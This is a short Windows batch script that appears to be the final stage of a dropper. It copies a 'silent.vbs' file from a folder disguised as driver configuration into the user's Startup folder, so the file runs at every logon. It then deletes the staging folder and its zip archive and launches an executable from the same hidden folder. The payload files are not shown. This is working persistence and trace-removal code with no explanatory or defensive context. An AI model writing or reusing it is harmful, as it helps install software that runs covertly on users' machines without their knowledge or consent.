copy %USERPROFILE%\.driverconfig\silent.vbs "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

rd a
del a.zip
start %USERPROFILE%\.driverconfig\your_project.exe
exit